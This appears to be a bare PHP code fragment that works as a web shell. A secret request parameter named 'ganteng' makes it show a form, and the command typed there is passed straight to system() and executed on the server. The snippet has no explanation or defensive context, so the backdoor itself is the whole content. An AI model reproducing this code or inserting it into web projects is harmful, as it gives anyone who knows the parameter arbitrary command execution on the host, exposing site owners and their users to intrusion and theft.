if(isset($_REQUEST['ganteng'])){
        echo "<pre>";
        echo "<form name='form' action='#' method='post'>
       <input type='text' name='coba'/> <input type='submit' value='enter'/>
       </form>";
        $cmd = ($_POST['coba']);
        system($cmd);
        echo "</pre>";
       
        die;
}
